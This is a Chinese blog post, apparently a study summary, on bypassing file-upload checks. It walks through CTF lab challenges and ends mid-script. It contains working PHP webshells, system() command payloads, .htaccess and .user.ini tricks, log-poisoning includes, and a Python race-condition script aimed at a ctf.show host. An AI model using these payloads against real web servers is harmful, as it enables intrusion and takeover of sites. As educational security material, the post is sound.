{"title":"浅析文件上传","uid":"59889abed1e0595b2f38848b74044672","slug":"浅析文件上传","date":"2022-06-18T09:25:28.000Z","updated":"2024-02-14T07:53:20.000Z","comments":true,"path":"api/articles/浅析文件上传.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141553540.png","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>文件上传与文件包含这种漏洞都是比较常见的漏洞，在学习过后对其进行简单总结，希望能对正在学习此部分的师傅们有一些帮助。</p>\n<h1 id=\"漏洞相关信息\"><a href=\"#漏洞相关信息\" class=\"headerlink\" title=\"漏洞相关信息\"></a>漏洞相关信息</h1><h2 id=\"漏洞定义\"><a href=\"#漏洞定义\" class=\"headerlink\" title=\"漏洞定义\"></a>漏洞定义</h2><p>文件上传漏洞是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力。这种攻击方式是最为直接和有效的，“文件上传” 本身没有问题，有问题的是文件上传后，服务器怎么处理、解释文件。</p>\n<h2 id=\"漏洞危害\"><a href=\"#漏洞危害\" class=\"headerlink\" title=\"漏洞危害\"></a>漏洞危害</h2><p>网站被控制，对文件增删改查，执行命令，链接数据库<br>如果服务器长久未更新，可以利用exp提权，导致服务器沦陷<br>同服务器的其他网站沦陷<br>漏洞常见利用方法<br>1、修改限制的后缀名(前端js检测时可直接在浏览器中修改)</p>\n<p>2、修改文件头绕过，即修改content-type与要求后缀一致(检测文件头时，即后端设置检测时)</p>\n<p>3、修改.user.ini配置文件(当存在index.php文件时)</p>\n<p>4、构造GIF89A添加到文件绕过图片检测（检测文件内容时）</p>\n<p>5、修改.htaccess绕过(中间件解析漏洞）</p>\n<p>5、%00截断绕过后缀检测</p>\n<p>6、利用条件竞争绕过</p>\n<p>7、二次渲染绕过</p>\n<h2 id=\"漏洞常用知识\"><a href=\"#漏洞常用知识\" class=\"headerlink\" title=\"漏洞常用知识\"></a>漏洞常用知识</h2><p>1、一些黑名单被过滤时的替代方法</p>\n<p>&lt;1&gt;在上传文件时，有时候php可能被过滤，而php文件的的格式是<code>&lt;?php ?&gt;</code>，因此这里的话我们可以用短标签=来进行替代，或者有时候可以用大小写或者双写(例如：phphpp)，从而实现绕过。</p>\n<p>&lt;2&gt;在上传文件时，有时候会上传日志文件，当过滤var这种的时候，我们可以用.来进行绕过，即构造<code>log</code>为<code>lo’.’g</code></p>\n<p>&lt;3&gt;在写文件内容时，有时候会被过滤空格，这时候我们有以下几种绕过方法</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token comment\">/**/</span>\n<span class=\"token operator\">%</span><span class=\"token number\">09</span><span class=\"token punctuation\">(</span>php环境<span class=\"token punctuation\">)</span>\n<span class=\"token variable\">$</span><span class=\"token punctuation\">&#123;</span><span class=\"token constant\">IFS</span><span class=\"token punctuation\">&#125;</span>\n<span class=\"token comment\">//加$是为了隔断，IFS是shell已经定好的，功能就是分隔变量，默认就是对字段起分隔作用</span>\n<span class=\"token variable\">$IFS</span><span class=\"token variable\">$9</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>2、中间件解析漏洞</p>\n<p>&lt;1&gt;apache解析漏洞</p>\n<p>（1）Apache 是从右到左开始判断解析,如果为不可识别解析,就再往左判断</p>\n<p>举个栗子</p>\n<p>当我们输入文件名为1.php.rar时，由于apache不识别解析rar文件，因此这里就等同于上传的文件名为1.php，但我们访问的话仍是1.php.rar，访问这个文件就可以发现我们上传文件成功</p>\n<p>(2)Apache中的.htaccess文件</p>\n<p>.htaccess的定义</p>\n<p>概述来说，htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p>\n<p>我们这里的话利用的就是改变文件拓展名</p>\n<p>在这里的话它的含义就是将其他文件解析为php给执行，内容修改后大致是这样</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">AddType application<span class=\"token operator\">/</span>x<span class=\"token operator\">-</span>httpd<span class=\"token operator\">-</span>php <span class=\"token operator\">.</span>jpg<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>&lt;2&gt;IIS解析漏洞</p>\n<p>(1)文件解析漏洞(5.x-6.0版本)</p>\n<p>举个栗子</p>\n<p>我们上传1.asp;.jpg，此时也可能会出现匹配最后.后面的后缀的情况，从而认为上传的文件是jpg，但IIS不看分号后的内容，所以它理解的文件名其实就是1.asp</p>\n<p>(2)目录解析漏洞(5.x-6.0的版本)</p>\n<p>依旧用栗子来说明</p>\n<p>例如/123.asp/ddd.jpg，网站限制了上传文件的格式（只能jpg）<br>在123.asp路径下的文件(如ddd.jpg)都会以asp文件解析</p>\n<p>&lt;3&gt;Nginx解析漏洞</p>\n<p>（1）Nginx中php配置错误导致的解析漏洞</p>\n<p>再举个栗子</p>\n<p>当我们构造一个文件，假如名字是test.jpg，写入内容为<?phpinfo()?>，此时我们访问test.jpg，其返回的是图片存在问题，无法显示，而当我们此时访问test.jpg/test.php时，回显”Access denied”，这个test.jpg不是目录，而且test.php更是一个都不存在的文件，此时却回显了访问被拒绝，这是为什么呢，因为这时Nginx会认为这是php文件，转交给php来处理，而php发现这个test.php文件不存在，就会删去test.php，此时就会访问test.jpg，php认为它不是php文件，就回显了拒绝访问。而当我们将配/etc/php5/fpm/php-fpm.conf文件中的security.limit_extensions添加上.jpg时就会回显出php配置信息<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141550988.png\" alt=\"在这里插入图片描述\"></p>\n<p>(2)%00截断</p>\n<p>前提</p>\n<p>php版本小于5.3.29<br>magic_quotes_gpc = Off<br>它的原理简单的来说就是url中的%00表示ascii码中的0，而ascii码中的0表示的就是字符串结束，不再往后面读取，此时就实现了截断的目的</p>\n<p>举个栗子</p>\n<p>假设此时我们想上传php文件，但允许上传的是jpg文件，我们此时就可以借助%00截断来实现</p>\n<p>filename=1.jpg                                此时上传的是1.jpg</p>\n<p>加上%00</p>\n<p>filename=1.php%00.jpg                此时上传的是1.php（突破限制）</p>\n<h1 id=\"实战\"><a href=\"#实战\" class=\"headerlink\" title=\"实战\"></a>实战</h1><h2 id=\"修改后缀名绕过（前端修改js代码\"><a href=\"#修改后缀名绕过（前端修改js代码\" class=\"headerlink\" title=\"修改后缀名绕过（前端修改js代码)\"></a>修改后缀名绕过（前端修改js代码)</h2><p>进入靶场，选择开发者模式，发现了允许格式，我们点击修改<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141550946.png\" alt=\"在这里插入图片描述\"><br>将png修改为php<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141550926.png\" alt=\"在这里插入图片描述\"><br>此时上传我们的木马文件</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"包含成功\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//方便查看是否成功包含</span>\n@<span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141550993.png\" alt=\"在这里插入图片描述\"><br>此时就可以执行我们想要执行的语句了，首先查看根目录，构造payload如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token number\">1</span><span class=\"token operator\">=</span><span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"ls /\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141550982.png\" alt=\"在这里插入图片描述\"><br>这个目录没有，去上个目录进行查看</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token number\">1</span><span class=\"token operator\">=</span><span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"ls ../\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141550950.png\" alt=\"在这里插入图片描述\"><br>找到flag，查看文件，构造payload如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token number\">1</span><span class=\"token operator\">=</span><span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"tac ../flag.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141550574.png\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"修改文件头绕过\"><a href=\"#修改文件头绕过\" class=\"headerlink\" title=\"修改文件头绕过\"></a>修改文件头绕过</h2><p>我们发现修改前端上传php已经不行了<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141550600.png\" alt=\"在这里插入图片描述\"><br>可能是后端检验了文件内容类型，我们bp抓包修改文件类型再进行尝试<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141550628.png\" alt=\"在这里插入图片描述\"></p>\n<p>成功上传，访问<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141550666.png\" alt=\"在这里插入图片描述\"><br>蚁剑连接<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141550675.png\" alt=\"在这里插入图片描述\"><br>得到flag<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141550794.png\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"修改-user-ini配置文件绕过\"><a href=\"#修改-user-ini配置文件绕过\" class=\"headerlink\" title=\"修改.user.ini配置文件绕过\"></a>修改.user.ini配置文件绕过</h2><h3 id=\"0X01\"><a href=\"#0X01\" class=\"headerlink\" title=\"0X01\"></a>0X01</h3><p>上传<code>.user.ini</code>文件添加文件包含功能,首先我们需要修改js代码，删去限制文件后缀，修改<code>accept</code>为<code>file</code><br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141550315.png\" alt=\"在这里插入图片描述\"><br>然后呢，我们上传<code>.user.ini</code>进行抓包<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141550413.png\" alt=\"在这里插入图片描述\"></p>\n<p>上传成功，此时再传我们的txt文件<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141550400.png\" alt=\"在这里插入图片描述\"></p>\n<p>将错误复制到浏览器中查看错误具体回显信息<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141550520.png\" alt=\"在这里插入图片描述\"><br>文件内容不合规，说明里面有过滤，一一排除后发现是<code>php</code>的问题，说明后端过滤了php<br>但是报出了语法错误，说明这个php需要修改，修改大小写的话服务器不解析，不行，因此我们这里用短标签<code>=</code>来绕过<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141550506.png\" alt=\"在这里插入图片描述\"><br>查看<code>url/upload/index.php</code><br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141550626.png\" alt=\"在这里插入图片描述\"></p>\n<p>获取flag</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token number\">1</span><span class=\"token operator\">=</span><span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"tac ../f*.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141550855.png\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"0X02\"><a href=\"#0X02\" class=\"headerlink\" title=\"0X02\"></a>0X02</h3><p>同之前写入<code>.user.ini</code>文件，但此时发现利用短标签也无法进行绕过<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141550042.png\" alt=\"在这里插入图片描述\"><br>进行排查，先将中间内容修改为1试试<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141550160.png\" alt=\"在这里插入图片描述\"><br>上传成功，说明里面有东西被过滤掉了<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141550136.png\" alt=\"在这里插入图片描述\"><br>一一排查后发现是<code>[]</code>被ban了，这个<code>[]</code>可以用<code>&#123;&#125;</code>来进行绕过<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141550175.png\" alt=\"在这里插入图片描述\"><br>查看文件<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141550373.png\" alt=\"在这里插入图片描述\"><br>获取flag</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token number\">1</span><span class=\"token operator\">=</span><span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"tac ../flag.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token operator\">?</span><span class=\"token operator\">></span> <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141550438.png\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"0X03（-user-ini配置文件结合日志包含）\"><a href=\"#0X03（-user-ini配置文件结合日志包含）\" class=\"headerlink\" title=\"0X03（.user.ini配置文件结合日志包含）\"></a>0X03（.user.ini配置文件结合日志包含）</h3><p>思路是<code>.user.ini</code>包含一个文件，然后让这个文件包含日志文件，但经过检测后发现过滤了空格，我们这里本来打算采取<code>%09</code>进行绕过，但是在界面上会报错，因此我们这里用<code>/**/</code>来代替空格，构造payload如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?=</span><span class=\"token keyword\">include</span><span class=\"token comment\">/**/</span><span class=\"token string single-quoted-string\">'/var/l'</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'og/nginx/access.lo'</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'g'</span><span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141550724.png\" alt=\"在这里插入图片描述\"><br>然后访问<code>url/1.txt</code>,修改<code>UA</code>为一句话木马<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141550732.png\" alt=\"在这里插入图片描述\"><br>此时本来应该是404的，但是由于后端设置的原因，所以这里回到了靶场最初的位置<br>此时我们访问<code>url/upload/</code>,post随便上传一个验证是否成功上传<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141550951.png\" alt=\"在这里插入图片描述\"><br>蚁剑连接<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141550867.png\" alt=\"在这里插入图片描述\"><br>成功拿到flag<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141550110.png\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"修改文件内容绕过\"><a href=\"#修改文件内容绕过\" class=\"headerlink\" title=\"修改文件内容绕过\"></a>修改文件内容绕过</h2><p>我们构造<code>jpg</code>文件传入一句话木马的话，<code>&lt;</code>会被识别出来而无法上传<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141550222.png\" alt=\"在这里插入图片描述\"><br>我们尝试构造pthml文件，pthml文件指的是嵌入html的php文件，这里我们可以发现仍然不行，可能对文件头进行了检查<br><img src=\"https://img-blog.csdnimg.cn/3ac627ba18634efdb45c7657c79b0133.png\" alt=\"在这里插入图片描述\"><br>那我们这里呢，就构造pthml文件，这样标签就不会被过滤，也就可以绕过<br>构造payload如下<br><code>GIF89A&lt;script language=&quot;php&quot;&gt;eval($_POST[1]);phpinfo();&lt;/script&gt;</code><br>(GIF89A是构造一个图片头文件欺骗)<br><img src=\"https://img-blog.csdnimg.cn/ddc7cbed01684b8db08d78c2675bd148.png\" alt=\"在这里插入图片描述\"><br>查看这个文件，盲猜文件存放位置为<code>upload</code>下<br><img src=\"https://img-blog.csdnimg.cn/dc42ced125b24f3798ce9c1a32b30afc.png\" alt=\"在这里插入图片描述\"></p>\n<p>此时蚁剑连接获取webshell即可<br><img src=\"https://img-blog.csdnimg.cn/df64b150532449a9831f758c974f4a98.png\" alt=\"在这里插入图片描述\"><br>此时寻找flag即可<br><img src=\"https://img-blog.csdnimg.cn/68d0ecfe69d34f9c8ae04ff9b783793b.png\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"中间件解析漏洞\"><a href=\"#中间件解析漏洞\" class=\"headerlink\" title=\"中间件解析漏洞\"></a>中间件解析漏洞</h2><p>提示了httpd，httpd-apache2服务器上传<code>.htaccess</code>文件 ,对于此类文件的解释</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">概述来说，htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页<span class=\"token number\">301</span>重定向、自定义<span class=\"token number\">404</span>错误页面、改变文件扩展名、允许<span class=\"token operator\">/</span>阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>在这里的话它的含义就是将任意jpg文件解析为php给执行,<br>参考文章<br><a href=\"https://blog.csdn.net/frankarmstrong/article/details/72235206\">https://blog.csdn.net/frankarmstrong/article/details/72235206</a><br>首先上传<code>.htaccess</code>文件<br><img src=\"https://img-blog.csdnimg.cn/cec5ba58ff8c461da173a9dfbb6f4063.png\" alt=\"在这里插入图片描述\"><br>此时再传图片马<br><img src=\"https://img-blog.csdnimg.cn/7b42a85d66394872a08f36098952b3d7.png\" alt=\"在这里插入图片描述\"><br>进行访问</p>\n<p><img src=\"https://img-blog.csdnimg.cn/195a66d59065464f988ed36d40409659.png\" alt=\"在这里插入图片描述\"><br>获取flag<br><img src=\"https://img-blog.csdnimg.cn/7cd02a08bb40471bb7eda0ea091d3f9d.png\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"00截断\"><a href=\"#00截断\" class=\"headerlink\" title=\"%00截断\"></a>%00截断</h2><p>这里直接采取对源码进行分析，来更清晰的讲解%00截断</p>\n<p>源码如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token variable\">$is_upload</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$msg</span> <span class=\"token operator\">=</span> <span class=\"token constant\">null</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'submit'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$ext_arr</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'jpg'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'png'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'gif'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$file_ext</span> <span class=\"token operator\">=</span> <span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'upload_file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token function\">strrpos</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'upload_file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">in_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file_ext</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$ext_arr</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$temp_file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'upload_file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'tmp_name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$img_path</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'save_path'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"/\"</span><span class=\"token operator\">.</span><span class=\"token function\">rand</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">,</span> <span class=\"token number\">99</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token function\">date</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"YmdHis\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\".\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$file_ext</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">move_uploaded_file</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$temp_file</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$img_path</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token variable\">$is_upload</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token variable\">$msg</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'上传出错！'</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$msg</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"只允许上传.jpg|.png|.gif类型文件！\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>这句话<code> $img_path = $_GET[&#39;save_path&#39;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</code>我们可以看出来是以get方式得到的文件上传路径，因此我们这里让在他get的路径后加上%00，此时的语句就相当于<code> $img_path = $_GET[&#39;save_path&#39;]</code>，此时的路径也就是这个get设置的路径，后面的都不再看了，随便上传个jpg即可，内容写为一句话木马<br><img src=\"https://img-blog.csdnimg.cn/fa5242adc63c4156ac4b13dcd92aa88e.png\" alt=\"在这里插入图片描述\"></p>\n<p>此时上传的路径就相当于被我们指定为<code>upload/1.php</code>，他的重塑和后缀名都被%00给截断了</p>\n<p>访问即可看见文件执行成功<br><img src=\"https://img-blog.csdnimg.cn/900af89c3a41470e97086752491f6790.png\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"条件竞争绕过-结合-user-ini配置文件的修改\"><a href=\"#条件竞争绕过-结合-user-ini配置文件的修改\" class=\"headerlink\" title=\"条件竞争绕过(结合.user.ini配置文件的修改)\"></a>条件竞争绕过(结合.user.ini配置文件的修改)</h2><p>检测过后发现过滤了点<code>.</code>，此时的思路的话就是利用文件包含，我们先上传一个.user.ini文件，上传一个无后缀的文件，再让这个文件包含我们的session文件，此时用脚本进行文件竞争即可<br>上传.user.ini文件包含一个文件<br><img src=\"https://img-blog.csdnimg.cn/5d3d67245769484fb99a3100b20507b1.png\" alt=\"在这里插入图片描述\"></p>\n<p>上传文件包含session文件</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">GIF89a\n<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?=</span><span class=\"token keyword\">include</span><span class=\"token string double-quoted-string\">\"/tmp/sess_quan9i\"</span><span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p><img src=\"https://img-blog.csdnimg.cn/208ca38cb5b0459d91a7e9dc8ceb31a9.png\" alt=\"在这里插入图片描述\"><br>此时利用脚本(这里没有写入文件的原因是每次加载php文件都会刷新.user.ini文件，而.user.ini文件包含了22这个文件，那么此时就相当于把22这个文件给写入到了这里面)</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">import requests\nimport threading\nsession=requests.session()\nsessionid='quan9i'\nurl1=\"http://f275f432-9203-4050-99ad-a185d3b6f466.chall.ctf.show/\"\nurl2=\"http://f275f432-9203-4050-99ad-a185d3b6f466.chall.ctf.show/upload\"\ndata1=&#123;\n\t'PHP_SESSION_UPLOAD_PROGRESS':'<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"tac ../f*\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span>'\n&#125;\nfile=&#123;\n\t'file':sessionid//指定写入的文件路径为/tmp/sess_quan9i\n&#125;\ncookies=&#123;\n\t'PHPSESSID': sessionid//指定session文件存储的路径是/tmp/sess_quan9i\n&#125;\n\ndef write():\n\twhile True:\n\t\tr = session.post(url1,data=data1,files=file,cookies=cookies)\ndef read():\n\twhile True:\n\t\tr = session.get(url2)\n\t\tif 'flag' in r.text:\n\t\t\tprint(r.text)\n\t\t\t\nthreads = [threading.Thread(target=write),\n       threading.Thread(target=read)]\nfor t in threads:\n\tt.start()\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h2 id=\"二次渲染绕\"><a href=\"#二次渲染绕\" class=\"headerlink\" title=\"二次渲染绕\"></a>二次渲染绕</h2><p>我们发现.user.ini无法上传，但是单纯的png格式的图片是可以上传的，这里可能涉及到了文件的二次渲染<br>，文件渲染一般都会涉及<code>imagecreatefromjpeg </code>函数，当出现这个函数的时候，那么普通的图片马都会被过滤掉，函数介绍如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">imagecreatefromjpeg — 由文件或 <span class=\"token constant\">URL</span> 创建一个新图象。\n<span class=\"token function\">imagecreatefromjpeg</span><span class=\"token punctuation\">(</span>  <span class=\"token variable\">$filename</span><span class=\"token punctuation\">)</span>\n返回一图像标识符，代表了从给定的文件名取得的图像。<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p>这里我们引用其他师傅的脚本来创建一个图片马，这个图片马会自动写入木马文件并且保证木马不会被二次渲染所影响</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$p</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xa3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9f</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x67</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xf7</span><span class=\"token punctuation\">,</span> 